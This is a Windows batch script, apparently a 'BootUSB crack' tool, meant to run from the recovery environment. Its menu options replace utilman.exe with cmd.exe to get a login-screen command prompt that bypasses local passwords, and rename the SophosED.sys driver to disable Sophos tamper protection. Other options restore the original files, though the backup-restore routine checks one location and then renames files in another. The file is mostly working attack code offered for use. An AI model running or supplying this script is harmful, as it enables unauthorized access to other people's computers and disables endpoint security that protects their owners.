@echo off
setlocal enabledelayedexpansion

rem Crack Script Made by S1rDyn0
rem Contributors: Viren070

if /i "%CD:~0,2%" NEQ "X:" (
  color 0C
  color 0C
  echo                __
  echo               / _^)
  echo      _.----._/ /
  echo     /         /
  echo  __/ ^(  ^| ^(  ^|
  echo /__.-^'^|_^|--^|_^|
  echo EXPLOIT ERROR... & echo:
  echo You must be in the Installer/Recovery environment to run this script^!
  pause
  cls
  color 07
  exit 
) else (
  cls
  color 3F
  echo: & echo Proceed with caution, we do not take any responsibility for damage caused by this script.
  echo Credit to S1rDyno for the orginal script ^& Viren070 for contributing to improve it.
  echo: & echo https://github.com/S1rDyn0/BootUSB-Crack-Script ^| OpenSource & echo: & echo: & echo:
  pause
)
:menu
color 07
cls
echo ^|==================================^|
echo ^|  WINDOWS 10  EXPLOIT BY S1rDyn0  ^|
echo ^|   ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~    ^| 
echo ^|                                  ^|
echo ^|  BUILD ^| Production    23.5.10  ^|
echo ^|==================================^| & echo: & echo:
echo ^[1^] Local Password Exploit
echo ^[2^] Disable Sophos Tamper Protection
echo ^[3^] Password ^& Sophos Exploit
echo ^[4^] Show On-Screen Keyboard
echo ^[5^] Restore Password Exploit
echo ^[6^] Recover Files from Backup
echo ^[0^] Exit
echo: & echo: & echo:

set validOptions=0 1 2 3 4 5 6
set /p "crackType=^>"

set optionFound=false
for %%a in (!validOptions!) do (
  if "!crackType!"=="%%a" (
    set optionFound=true
  )
)

if not !optionFound!==true (
  color 0C
  cls
  call :showDinoError
  echo Looks like that^'s an invalid option^!
  timeout /t 5 
  goto menu
)

if "!crackType!" EQU "0" (
  color 07
  cls & echo Exiting...
  exit 
)

if "!crackType!" EQU "1" (
  call :exploit1
)

if "!crackType!" EQU "2" (
  call :exploit2
)

if "!crackType!" EQU "3" (
  call :exploit3
)

if "!crackType!" EQU "4" (
  echo Running OSK.exe...
  start "" "C:\windows\system32\osk.exe" || goto :cmdFail
  color 0A
  cls
  echo Started OSK.exe 
  echo Returning to menu...
  timeout /t 5
  
  goto :menu
)

if "!crackType!" EQU "5" (
  call :exploit5
)

if "!crackType!" EQU "6" (
  call :exploit6
)

goto :menu


:exploit1
cls
echo Starting Hack
echo.
if exist "c:\windows\system32" (
  echo System Directory Found	
  echo Renaming utilman.exe to utilman.old
  echo.
  ren C:\windows\system32\utilman.exe utilman.old || goto :cmdFail
  echo.
  echo Copying cmd.exe to utilman.exe
  echo.
  copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto :cmdFail

  echo -----------------------------------
  color 0A
  echo Exploit Completed ^| No errors
  pause
  goto menu

) else (
  color 0C
  call :showDinoError
  echo Could not find System Directory... & echo:
  echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

:exploit2
cls
echo Starting Hack
if exist "c:\windows\system32\drivers" (
  echo System Directory Found
    
  echo Renaming SophosED.sys to SophosED.sys.old
  ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto :cmdFail
  
  color 0A
  echo -----------------------------------
  echo Exploit Completed ^| No errors
  pause
  goto menu

) else (
  color 0C
  call :showDinoError
  echo Could not find System Directory... & echo:
  echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

:exploit3
cls
echo Starting Hack
if exist "c:\windows\system32" (
  echo System Directory Found

  echo Renaming utilman.exe to utilman.old
  ren C:\windows\system32\utilman.exe utilman.old || goto :cmdFail

  echo Copying cmd.exe to utilman.exe
  copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto :cmdFail

  if exist "c:\windows\system32\drivers" (
    echo System Directory Found
      
    echo Renaming SophosED.sys to SophosED.sys.old
    ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto :cmdFail

    color 0A
    echo -----------------------------------
    echo Exploit Completed ^| No errors
    pause
    goto menu

  ) else (
    color 0C
    call :showDinoError
    echo Could not find System Directory... & echo:
    echo Failing Exploit and returning to menu
    timeout /t 5 
    goto menu
  )

) else (
  color 0C 
  call :showDinoError
  echo Could not find System Directory... & echo:
  echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

:exploit5
cls
echo Preparing restore...
if exist "c:\windows\system32" (
  echo Located System folder
) else (
  color 0C
  call :showDinoError
  echo Could not find System Folder... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "c:\windows\system32\utilman.old" (
  echo Original utilman.exe file found
) else (
  color 0C
  call :showDinoError
  echo Could not find utilman.old... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "c:\windows\system32\cmd.exe" (
  echo Original cmd.exe file found
) else (
  color 0C
  call :showDinoError
  echo Could not find cmd.exe... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "c:\windows\system32\utilman.exe" (
  echo Exploit utilman.exe file found
) else (
  color 0C
  call :showDinoError
  echo Could not find exploited utilman... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

echo All system files located! & echo: & echo Starting restore...
echo Deleting exploited utilman.exe
del C:\windows\system32\utilman.exe || goto cmdFail
echo Renaming utilman.old to utilman.exe 
ren C:\windows\system32\utilman.old utilman.exe || goto cmdFail

color 0A
echo -----------------------------------
echo Restore Completed ^| No errors
pause
goto menu

:exploit6
cls
echo Preparing restore...
if exist "x:\sources\restore" (
  echo Located restore folder
) else (
  color 0C
  call :showDinoError
  echo Could not find Restore Folder... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "x:\sources\restore\cmd.exe" (
  echo Command Prompt backup found
) else (
  color 0C
  call :showDinoError
  echo Could not find Command Prompt backup... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "x:\sources\restore\utilman.exe" (
  echo Utilman backup found
) else (
  color 0C
  call :showDinoError
  echo Could not find Utilman backup... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

echo Backup files located! & echo: & echo Starting restore...
echo Deleting exploited utilman.exe
del C:\windows\system32\utilman.exe || goto :cmdFail
echo Renaming utilman.old to utilman.exe
ren C:\windows\system32\utilman.old utilman.exe || goto :cmdFail

color 0A
echo -----------------------------------
echo Restore Completed ^| No errors
pause
goto menu

:cmdFail
call :showDinoError
echo An error occurred during command execution.
echo Failing Exploit and returning to menu
pause
goto menu

:showDinoError
color 0C
echo                __
echo               / _^)
echo      _.----._/ /
echo     /         /
echo  __/ ^(  ^| ^(  ^|
echo /__.-^'^|_^|--^|_^|
echo EXPLOIT ERROR... & echo:
